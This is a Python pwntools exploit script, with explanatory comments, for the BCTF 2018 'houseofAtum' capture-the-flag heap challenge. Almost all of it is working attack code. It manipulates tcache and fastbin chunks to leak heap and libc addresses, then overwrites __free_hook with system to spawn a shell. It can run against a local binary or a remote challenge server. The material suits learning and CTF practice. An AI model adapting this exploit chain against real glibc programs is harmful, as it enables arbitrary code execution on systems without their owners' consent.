# Credits: https://changochen.github.io/2018-11-26-bctf-2018.html
# 
# I didn't manage to solve this challenge. After reading Ne0's write-up, 
# I found it interesting enough to debug the exploit and document it a little further
# so that others and I can visualize the allocations/free's better.

from pwn import *

def alloc(data):
	r.sendlineafter('choice:', '1')
	r.sendafter('content:', data)

def edit(idx, data):
	r.sendlineafter('choice:', '2')
	r.sendlineafter('idx:', str(idx))
	r.sendafter('content:', data)

def free(idx, delete):
	r.sendlineafter('choice:', '3')
	r.sendlineafter('idx:', str(idx))
	if delete == "pwned":
		return
	r.sendlineafter('(y/n):', delete)

def show(idx):
	r.sendlineafter('choice:', '4')
	r.sendlineafter('idx:', str(idx))

def leak(idx, ru):
	show(idx)
	r.recvuntil(ru)
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	# leak heap
	alloc("123")
	alloc("123")

	free(1,'y')
	free(0,'y')

	alloc('1')	

	heap = leak(0, 'Content:') - 0x231
	log.success('Heap: 0x{:x}'.format(heap))	

	free(0, 'y')

	# heap + 0x68 is the tcache entry which stores 0x50 size chunks.
	# We'll use that afterwards in order to expand the wilderness
	# and properly set up a fake small chunk by zeroing out the tcache entry.
	alloc(p64(0)*7+p64(0x61)+p64(heap+0x68))
	alloc('123')

	# I highly recommend checking out Ne0's write-up on this part,
	# he illustrates the trick quite nicely.
	for i in range(7):
		free(0,'n')
	
	free(1, 'y')
	free(0, 'y')

	alloc('123')
	alloc('123')

	free(1,'y')
	# get back heap + 0x68 + null the tcache entry
	alloc(p64(0))
	# craft a fake small chunk at heap + 0x280
	edit(0,p64(0)*3+p64(0xa1))
	free(0, 'y')
	# null the tcache entry
	edit(1, p64(0))
	# get back fastbin chunk
	alloc("123")
	free(0,'y')
	# null the entry again, only this time we'll get back the top chunk
	edit(1,p64(0))
	# spray a couple of 0x21's to bypass _int_free's checks
	# see https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_free.c#L59
	alloc(p64(0x21)*9)

	free(0, 'y')
	# overwrite the tcache entry with our fake small chunk
	edit(1, p64(heap + 0x280))
	alloc('123')

	for i in range(0x7):
		free(0,'n')
	# place our fake small chunk in the unsorted bin
	free(0,'y')
	
	# get it back and leak libc
	edit(1,p64(heap + 0x260))
	alloc("A"*0x20)

	libc = leak(0, 'A'*0x20) - 0x3ebca0
	__free_hook = libc + 0x3ed8e8
	system = libc + 0x4f440
	log.success('Libc: 0x{:x}'.format(libc))

	free(0, 'y')
	# overwrite tcache entry with __free_hook's address
	edit(1,p64(__free_hook))
	alloc(p64(system))
	edit(1,'sh\x00')

	free(1, 'pwned')
	
	r.interactive()

if __name__ == "__main__":
	if sys.argv[1] == "r":
		r = remote('39.96.13.122', 9999)
	else:
		r = process('./houseofAtum')
		pause()
	pwn()
